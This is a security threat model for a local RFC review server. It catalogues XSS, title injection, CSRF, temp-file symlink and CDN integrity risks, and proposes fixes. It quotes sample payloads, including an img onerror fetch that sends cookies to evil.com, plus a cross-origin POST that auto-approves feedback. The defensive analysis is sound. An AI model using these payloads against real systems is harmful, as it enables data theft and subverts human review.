# Threat Model: dev-rfc Review UI

## 1. Overview

dev-rfc is a CLI-invoked skill for generating RFCs and technical proposals. Its review subsystem launches a local HTTP server (default port 3118) that renders user-submitted RFC markdown in the browser and collects structured feedback. The system has two runtime implementations: a TypeScript server using Bun (`scripts/generate_review.ts`) and a Python server using `http.server` (`scripts/generate_review.py`), both backed by a shared HTML template (`assets/review_template.html`). A third mode (static) writes a standalone HTML file to disk instead of starting a server.

The review UI supports two interactive modes: **batch mode** (full RFC rendered at once, user adds per-section and inline comments) and **live mode** (agent pushes sections one-at-a-time via HTTP API, user reviews each via SSE real-time updates). Markdown rendering is performed client-side using the `marked` library (v15, loaded from CDN with local fallback at `assets/marked.min.js`). Mermaid diagrams and Shiki syntax highlighting are also loaded from CDNs. Feedback is persisted as JSON files to a workspace directory on the local filesystem.

The server runs on `127.0.0.1` (localhost only), without network endpoints exposed to external hosts, and is typically invoked by a developer running Claude Code on their local machine. The primary security goals are: (1) prevent arbitrary code execution on the host via crafted markdown content, (2) prevent exfiltration of local files or sensitive data through the review UI, and (3) ensure the server does not allow unintended file writes outside the designated workspace directory.

## 2. Threat model, Trust boundaries and assumptions

### Assets / security goals

- **Host integrity and user files**: The review server runs with full user privileges. Compromise means arbitrary read/write to the user's filesystem.
- **Browser session integrity**: The review UI runs in the user's browser. XSS allows exfiltration of any data the browser can access on `localhost:3118`, and potentially triggering server-side actions via the API.
- **Feedback data integrity**: Feedback JSON files in the workspace directory should only be written by legitimate user interactions, not injected by crafted markdown.
- **Developer environment confidentiality**: Environment variables, local files, and other services on localhost should not be reachable through the review UI.

### Trust boundaries & input classes

**Attacker-controlled inputs**
- **RFC markdown content**: The primary untrusted input. Markdown is authored by the agent (Claude Code) based on user instructions, but the content itself may incorporate untrusted data from external sources (user-pasted text, code snippets, RFC content from repositories). Enters the system at `generate_review.ts:312` / `generate_review.py:242` via `fs.readFileSync(mdPath)` and is embedded in the HTML via `JSON.stringify(mdContent)` at line 322 (TS) / 248 (PY). In live mode, markdown enters via `POST /api/section/add` body (`generate_review.ts:493-501`).
- **Document title** (`--title` CLI argument): User-controlled string embedded in the HTML at two locations: the `<title>` tag (line 6 of template) and the `<h1>` header (line 842). Escaping at `generate_review.ts:323` only replaces `"` with `&quot;`, leaving `<`, `>`, and `&` unescaped.
- **Previous feedback JSON** (`--previous-feedback` CLI argument): JSON file from a previous review round, loaded and embedded in the HTML at `generate_review.ts:324-326`. Content rendered into the DOM in previous-feedback sections.

**Operator-controlled inputs**
- **CLI arguments**: `--port`, `--workspace`, `--output`, `--iteration`, `--sections`. These control server binding, file paths for writes, and live mode configuration.
- **Workspace directory**: Determined by `--workspace` flag or derived from the markdown file's directory. All feedback writes go here.

**Developer-controlled inputs**
- **HTML template** (`assets/review_template.html`): Packaged with the skill, contains the client-side rendering logic.
- **Bundled libraries** (`assets/marked.min.js`, `assets/mermaid.min.js`): Local fallback copies of CDN libraries.
- **CDN-loaded scripts**: `marked@15` from jsdelivr, `mermaid@11` from jsdelivr, `shiki@3` from esm.sh.

### Assumptions & scope

- The server binds to `127.0.0.1` only, so remote network attacks are out of scope unless another application on the host can reach localhost (e.g., a malicious webpage performing cross-origin requests to `localhost:3118`).
- The primary threat actor is **crafted markdown content** — either malicious content in an RFC being reviewed, or an attacker who can influence the markdown the agent generates.
- Static mode writes HTML to `/tmp/` with a predictable filename, which is relevant on shared/multi-user systems.
- CDN dependencies are assumed trustworthy; supply chain attacks on jsdelivr/esm.sh are out of scope for this analysis but noted as a dependency risk.

## 3. Attack surface, mitigations and attacker stories

### 3.1 XSS via markdown rendering — `marked.parse()` to `innerHTML` (`assets/review_template.html`)

**Surface:** RFC markdown is parsed by `marked.parse()` (line 917 in batch mode, line 1510/1700 in live mode) and the resulting HTML is assigned to `innerHTML` (lines 919, 996/999, 1511, 1703). The `marked` library, in its default configuration (v15), converts markdown to HTML including raw HTML passthrough — meaning `<script>`, `<img onerror=...>`, `<svg onload=...>`, and other executable HTML in the markdown will be rendered as-is in the DOM.

**Risks:**
- **Stored XSS via raw HTML in markdown**: An RFC containing `<img src=x onerror="fetch('http://evil.com/steal?cookie='+document.cookie)">` or `<script>alert(1)</script>` will execute in the user's browser when the review UI renders it. The output of `marked.parse()` is assigned directly to `innerHTML` without any HTML sanitization (no DOMPurify, no CSP, no `marked` sanitizer option).
- **Exfiltration of localhost data**: Once JavaScript executes in the review UI context (`localhost:3118`), it can call the server's own API endpoints (`/api/feedback`, `/api/session`) to read or modify feedback data, or probe other localhost services.
- **DOM manipulation**: Injected scripts can modify the review UI to present fake content, hide real content, or auto-submit feedback (e.g., auto-approving an RFC).

**Mitigations/controls:**
- The markdown content is embedded in the HTML page via `JSON.stringify()` (line 322 of `generate_review.ts`), which properly escapes it for the JavaScript string context. The raw markdown string is safe during initial page load. The vulnerability is in the subsequent `marked.parse()` call that converts it to HTML and injects it via `innerHTML`.
- The `escapeHtml()` function (lines 1416-1420) is used for user-generated feedback text and headings in some places, but is NOT applied to the markdown-rendered HTML output.
- No Content Security Policy (CSP) header is set on the HTML response, so inline scripts and external resource loads are unrestricted.
- No `marked` configuration to disable raw HTML (e.g., `marked.use({ renderer: { html: () => '' } })` or a sanitizer option).

**Attacker story:** A developer reviews an RFC that includes a code example or quoted text from an external source. That text contains an `<img src=x onerror="...">` payload. When the review UI renders the markdown, the payload executes in the browser, exfiltrating the developer's feedback data or probing other localhost services. In typical local usage where the developer authored their own RFC, severity is lower; severity increases when reviewing RFCs from untrusted contributors or when markdown content is sourced from external repositories.

### 3.2 XSS via section heading injection — batch mode (`assets/review_template.html:998`)

**Surface:** In batch mode, after `marked.parse()` produces HTML, the code splits it into sections by `<h2>` tags (lines 921-942). Section headings are extracted via `node.textContent.trim()` and then interpolated into `innerHTML` at line 998: `<h2>${sec.heading}</h2>`. Since `textContent` strips HTML tags, this is safe for headings derived from normal markdown `## Title` syntax.

However, `sec.html` (line 999) contains the raw HTML output from `marked.parse()` for that section's body, which is injected directly into `innerHTML` without sanitization.

**Risks:**
- Section body HTML (`sec.html`) is the direct output of `marked.parse()` and contains any raw HTML from the markdown source. This is the same XSS vector as 3.1 but specifically in the per-section card rendering.

**Mitigations/controls:**
- Section headings use `textContent` extraction, which strips HTML — headings themselves are safe in batch mode.
- Section body content (`sec.html`) has no sanitization.

**Attacker story:** Same as 3.1, but the payload is in a section body rather than being a standalone script tag. An `<iframe>` or `<object>` tag in a section body would render in the section card.

### 3.3 XSS via live mode section content — SSE-pushed markdown (`assets/review_template.html:1700-1705`)

**Surface:** In live mode, the agent pushes markdown sections via `POST /api/section/add`. The server broadcasts the markdown via SSE. The client's `fillSectionContent()` function (line 1691) receives the markdown, runs `marked.parse(stripLeadingHeading(data.markdown))` at line 1700, and assigns the result to `innerHTML` at line 1703.

**Risks:**
- **Same XSS as 3.1**, but the attack vector is the live API: `POST /api/section/add` with a markdown payload containing raw HTML. Since the server binds to localhost, this requires either a compromised agent, a malicious process on the host, or a cross-origin request from a malicious webpage (limited by CORS, but the server sets no CORS headers — the browser default would block reading responses but not prevent simple POST requests).
- Additionally, `data.heading` in `fillSectionContent()` is rendered via `escapeHtml()` (line 1704), so headings are safe. But the markdown body is not.

**Mitigations/controls:**
- `escapeHtml()` is correctly applied to `data.heading` at line 1704.
- Markdown body goes through `marked.parse()` without sanitization.
- The server binds to `127.0.0.1`, limiting the API to local processes.

**Attacker story:** A malicious application on the developer's machine sends a `POST /api/section/add` request to `localhost:3118` with XSS payload in the markdown field. Since there is no authentication or CSRF protection on the API, the payload renders in the developer's browser.

### 3.4 HTML injection via `--title` argument (`generate_review.ts:323`, `review_template.html:6,842`)

**Surface:** The `--title` argument is embedded in two HTML contexts. In `generate_review.ts:323`, the only escaping is `title.replace(/"/g, "&quot;")`, which escapes double quotes but not `<`, `>`, or `&`. The title appears in:
1. `<title>RFC Review: __DOC_TITLE__</title>` (line 6) — inside a `<title>` element, where HTML tags are not rendered but `</title>` injection could break out.
2. `<span id="doc-title">__DOC_TITLE__</span>` (line 842) — inside a `<span>`, where `<script>` or event handlers would execute.

**Risks:**
- **HTML injection in the page header**: A title like `Foo<script>alert(1)</script>` would be embedded as `<span id="doc-title">Foo<script>alert(1)</script></span>` in the rendered HTML since `<` and `>` are not escaped.
- **Title element breakout**: A title containing `</title><script>...` would close the title element and inject a script in the head.

**Mitigations/controls:**
- Double quotes are escaped (`&quot;`), preventing attribute breakout.
- No escaping for `<`, `>`, or `&` — the escaping is incomplete for an HTML body context.
- In practice, the `--title` is typically set by the agent (Claude Code) based on the project name, making this a lower-risk vector. However, the project name itself comes from user input.

**Attacker story:** A user creates a project with a name containing HTML tags (e.g., `My<img src=x onerror=alert(1)>Project`). The agent passes this as the `--title` argument. The review UI renders the tag in the header, executing the payload.

### 3.5 Predictable temporary file path in static mode (`generate_review.ts:718`, `generate_review.py:568`)

**Surface:** In static mode, if no `--output` is specified, the HTML file is written to `/tmp/dev-rfc-review-{filename}.html` where `{filename}` is derived from the markdown file's basename. This path is predictable.

**Risks:**
- **Symlink race**: On a multi-user system, an attacker could create a symlink at `/tmp/dev-rfc-review-RFC-001.html` pointing to a sensitive file (e.g., `~/.ssh/authorized_keys`). When the script writes the HTML content, it overwrites the symlink target.
- **File overwrite**: The path is predictable and not created with exclusive flags (`O_EXCL`). Another process could race to write to the same path.

**Mitigations/controls:**
- The path includes the markdown filename, adding some variability.
- No symlink checks before writing.
- No exclusive creation flags.
- The test file uses `/tmp/dev-rfc-test-${Date.now()}` which is slightly less predictable due to the timestamp.

**Attacker story:** On a shared development server, attacker creates a symlink at the predictable `/tmp/dev-rfc-review-my-rfc.html` path pointing to the victim's `~/.bashrc`. When the victim runs the tool in static mode with `my-rfc.md`, the HTML content overwrites their `.bashrc`. This requires the attacker to predict the filename and win the race. On single-user workstations (typical usage), this is not exploitable.

### 3.6 No authentication or CSRF protection on the HTTP API (`generate_review.ts`, `generate_review.py`)

**Surface:** The server exposes several API endpoints without any authentication: `POST /api/feedback` (writes feedback JSON to disk), `POST /api/section/add` (adds content to the live session), `POST /api/section/update`, `POST /api/section/feedback`. There are no CSRF tokens, no session cookies, and no CORS headers.

**Risks:**
- **Cross-origin POST from malicious webpage**: A malicious website the developer visits could send `fetch('http://localhost:3118/api/feedback', { method: 'POST', body: '{"status":"approved"}' })`. Without CORS headers, the browser will make the request (preflight is not required for simple POST with `application/json` content type, though `Content-Type: application/json` does trigger preflight in most browsers). The response would be blocked by CORS, but the POST may still execute on the server.
- **Feedback tampering**: Any local process can call `POST /api/feedback` to overwrite the feedback file with arbitrary content, potentially auto-approving an RFC or injecting misleading feedback.

**Mitigations/controls:**
- Server binds to `127.0.0.1`, not reachable from the network.
- `Content-Type: application/json` triggers CORS preflight in modern browsers, which would be blocked since no `Access-Control-Allow-Origin` header is set. This incidentally provides some CSRF protection for JSON POST requests from browsers.
- No authentication tokens or session management.

**Attacker story:** A developer is reviewing an RFC while also browsing the web. A malicious webpage includes JavaScript that sends `POST http://localhost:3118/api/section/feedback` with `{"section":"abstract","action":"approve"}` to auto-approve a live session section. In practice, the CORS preflight for `Content-Type: application/json` would block this from a browser context. A local malicious process has no such restriction.

### 3.7 Feedback JSON file write to arbitrary workspace path (`generate_review.ts:477`, `generate_review.py:422`)

**Surface:** The `--workspace` CLI argument directly controls where feedback JSON files are written. The `POST /api/feedback` endpoint writes the entire POST body (after JSON validation) to `{workspace}/feedback.json`.

**Risks:**
- **Arbitrary file write via `--workspace`**: If an attacker can control the `--workspace` argument (e.g., in an automated CI pipeline), they could point it at a sensitive directory.
- **JSON content injection**: The POST body is validated only as "is it a JSON object?" at `generate_review.ts:474-475`. The content of the JSON is not schema-validated, allowing arbitrary JSON to be written to the feedback file.

**Mitigations/controls:**
- The workspace path is set by CLI argument, which is operator-controlled (the person or script invoking the tool).
- The feedback file is always named `feedback.json` within the workspace directory — the filename is not attacker-controlled.
- JSON validation ensures the file content is valid JSON, preventing binary/arbitrary content writes.

**Attacker story:** In a CI pipeline where the `--workspace` argument is derived from a PR title or branch name without sanitization, an attacker could set `--workspace /home/user/.ssh` causing writes to that directory. This is a deployment-specific concern rather than a vulnerability in the tool itself.

### 3.8 CDN dependency loading without integrity hashes (`assets/review_template.html:8-13`)

**Surface:** The HTML template loads three external scripts from CDNs without Subresource Integrity (SRI) hashes:
- `https://cdn.jsdelivr.net/npm/marked@15/marked.min.js` (line 8)
- `https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js` (line 10)
- `https://esm.sh/shiki@3/bundle/web` (line 13, loaded as ES module)

**Risks:**
- **Supply chain compromise**: If a CDN is compromised or a dependency is hijacked, malicious JavaScript would execute in every review UI session.
- **CDN unavailability**: If the CDN is unreachable, the fallback to local copies (`assets/marked.min.js`, `assets/mermaid.min.js`) activates. No fallback exists for Shiki.

**Mitigations/controls:**
- Local fallback copies for `marked` and `mermaid` (lines 9, 11).
- Pinned to major versions (`@15`, `@11`, `@3`) rather than latest, reducing the window for supply chain attacks.
- No SRI `integrity` attributes on any script tag.

**Attacker story:** An attacker compromises the `marked` package on npm. The CDN serves the compromised version. Every developer using the review UI loads the malicious script, which could exfiltrate RFC content, inject backdoors into feedback, or probe localhost services.

### 3.9 `killPort()` process termination without ownership validation (`generate_review.ts:23-48`, `generate_review.py:31-60`)

**Surface:** On startup, the server calls `killPort(port)` which runs `lsof -ti :{port}` and sends `SIGTERM` to every PID found. There is no verification that the process belongs to a previous instance of the review server.

**Risks:**
- **Killing unrelated processes**: If another application (a development server, database, or other service) is using port 3118, `killPort()` will terminate it without warning. On a developer workstation where port conflicts are possible, this could disrupt other work.

**Mitigations/controls:**
- The default port (3118) is uncommon, reducing the chance of conflict.
- `SIGTERM` allows graceful shutdown (not `SIGKILL`).
- Only runs on startup, not repeatedly.

**Attacker story:** A developer runs a service on port 3118 for another project. When they launch the RFC review UI, `killPort()` terminates their other service. This is a reliability/availability concern rather than a security vulnerability.

### Out-of-scope / not applicable

- **Remote network attacks**: The server binds to `127.0.0.1`, making direct remote exploitation not applicable. If the binding were changed to `0.0.0.0`, all localhost-specific mitigations would be invalidated.
- **SQL injection**: No database is used. Feedback is stored as flat JSON files.
- **Authentication bypass**: No authentication exists by design (single-user local tool). This would become a critical gap if the server were exposed to a network.
- **Memory corruption**: Both implementations use memory-safe languages (TypeScript/Bun, Python). The `marked` and `mermaid` JavaScript libraries are the closest to native code but run in the browser sandbox.

## 4. Systemic findings

### 4.1 No HTML sanitization on markdown-derived content

**Pattern:** `XSS_NO_SANITIZE` -- 4 instances
**Root cause:** The codebase uses `marked.parse()` to convert markdown to HTML and assigns the result to `innerHTML` in 4 distinct code paths, with no HTML sanitizer (such as DOMPurify) applied to the output in any of them.
**Affected files:** `assets/review_template.html` (lines 917-919, 996-999, 1510-1511, 1700-1705)
**Individual findings:** Section 3.1, Section 3.2, Section 3.3
**Recommended fix:** Add DOMPurify (or equivalent) as a sanitization step between `marked.parse()` and every `innerHTML` assignment. Create a single helper function:
```javascript
function renderMarkdown(md) {
  return DOMPurify.sanitize(marked.parse(stripFrontmatter(md)));
}
```
Replace all 4 direct `marked.parse()` → `innerHTML` paths with calls to this helper. Additionally, configure `marked` to disable raw HTML passthrough and add a Content Security Policy header to the server responses.
**Systemic severity:** High (4 instances, medium-high individual severity, highly centralizable fix via single helper function)

### 4.2 Incomplete HTML escaping for template placeholders

**Pattern:** `XSS_NO_SANITIZE` -- 2 instances
**Root cause:** Template placeholder replacement in `buildHtml()` uses context-inappropriate escaping. `__DOC_TITLE__` only escapes `"` but not `<>` (needed for HTML body context). `__MARKDOWN_CONTENT__` uses `JSON.stringify()` which is correct for its JavaScript string context, but `__DOC_TITLE__` appears in both a JavaScript context and two HTML contexts with only quote-escaping applied.
**Affected files:** `scripts/generate_review.ts:322-323`, `scripts/generate_review.py:248-249`, `assets/review_template.html:6,842`
**Individual findings:** Section 3.4
**Recommended fix:** Apply full HTML entity escaping to `__DOC_TITLE__` for its HTML contexts (replace `<`, `>`, `&`, `"`, `'`) or use separate escaping strategies for the `<title>` context vs the `<span>` context. A simple fix:
```typescript
function escapeHtmlAttr(s: string): string {
  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}
html = html.replace("__DOC_TITLE__", escapeHtmlAttr(title));
```
**Systemic severity:** Medium (2 instances in TS and PY implementations, medium individual severity, easy fix)

## 5. Exploit chains

### Chain 1: Markdown XSS to feedback tampering

**Path:**
1. [Markdown XSS via `marked.parse()` to `innerHTML`] (Medium) -- Attacker embeds `<script>` or event-handler HTML in RFC markdown content. Gains: JavaScript execution in the reviewer's browser on `localhost:3118`.
2. [No authentication on feedback API] (Low) -- Uses JavaScript execution from step 1 to call `POST /api/feedback` with `{"status": "approved"}`. Gains: Auto-approves the RFC without the reviewer's knowledge.
3. **Terminal impact:** Attacker-influenced RFC is approved without genuine human review, with the review UI showing a "Document Approved" overlay to conceal the manipulation.

**Chain severity:** High (terminal impact: bypasses human review process; in environments where RFC approval gates deployment, this enables shipping unreviewed changes)
**Preconditions:** Attacker can influence the markdown content of the RFC being reviewed (e.g., reviewing an RFC from an external contributor, or the RFC incorporates text from an untrusted source).
**Chain-breaking fix:** Fix finding 3.1 (add HTML sanitization to `marked.parse()` output). This breaks the chain at step 1 by preventing JavaScript execution.

### Chain 2: Markdown XSS to localhost service probing

**Path:**
1. [Markdown XSS via `marked.parse()` to `innerHTML`] (Medium) -- Attacker embeds JavaScript in RFC markdown. Gains: JavaScript execution in the reviewer's browser on localhost.
2. **Terminal impact:** The injected script uses `fetch()` to probe other localhost services (databases, dev servers, admin panels) and exfiltrate responses to an external server. Since the script runs on `localhost`, it bypasses network-level protections that would block external origins.

**Chain severity:** Medium-High (terminal impact: reconnaissance and potential data exfiltration from localhost services; severity depends on what other services the developer runs locally)
**Preconditions:** Same as Chain 1. Additionally requires the developer to have other services running on localhost with sensitive data.
**Chain-breaking fix:** Fix finding 3.1 (add HTML sanitization). Additionally, adding a strict Content Security Policy (`connect-src 'self'`) would prevent exfiltration even if XSS occurs.

## 6. Criticality calibration (critical, high, medium, low)

### Exploit chains

- **Markdown XSS to feedback tampering**: Crafted markdown → `marked.parse()` → `innerHTML` (XSS) → `POST /api/feedback` (auto-approve) → RFC approved without human review [High]
- **Markdown XSS to localhost probing**: Crafted markdown → XSS → `fetch()` to probe localhost services → data exfiltration [Medium-High]

### Systemic findings

- **No HTML sanitization on markdown-derived content**: 4 instances of `marked.parse()` → `innerHTML` without sanitization, recommended fix: add DOMPurify sanitization helper [High]
- **Incomplete HTML escaping for template placeholders**: 2 instances (`__DOC_TITLE__` in TS and PY), recommended fix: full HTML entity escaping [Medium]

### Individual findings

**High**
- XSS via `marked.parse()` output assigned to `innerHTML` in batch mode (line 917-919), live section rendering (line 1510-1511), and live SSE update (line 1700-1705). RFC markdown containing `<img onerror=...>`, `<svg onload=...>`, or `<script>` tags will execute in the reviewer's browser. Part of systemic finding 4.1.

**Medium**
- HTML injection via `--title` argument. Title is embedded in `<title>` and `<span>` elements with only double-quote escaping. A title containing `<script>` tags would execute. Part of systemic finding 4.2.
- No CSRF protection on API endpoints. Local processes can call `POST /api/feedback` or `POST /api/section/feedback` to tamper with feedback. Cross-origin browser requests are partially mitigated by CORS preflight for JSON content types.
- CDN dependencies loaded without Subresource Integrity hashes. Compromise of jsdelivr or esm.sh would inject malicious code into all review sessions.

**Low**
- Predictable `/tmp/dev-rfc-review-{name}.html` path in static mode. Symlink race possible on shared systems; not exploitable in typical single-user usage.
- `killPort()` terminates any process on the configured port without verifying ownership. Could disrupt other developer services on port conflict.
- Arbitrary workspace path via `--workspace` CLI argument. Operator-controlled, not attacker-controlled in typical usage.

**Scope note**: Findings rated High assume the RFC markdown may contain content from untrusted sources (external contributors, pasted code snippets, content from untrusted repositories). If the developer only reviews self-authored RFC content that they fully control, the XSS findings can be downgraded to Low since the "attacker" is the developer themselves. The localhost-binding of the server (`127.0.0.1`) means remote network-based exploitation is not possible; all findings assume the attacker can influence input data (markdown content or CLI arguments) rather than having direct network access to the server.
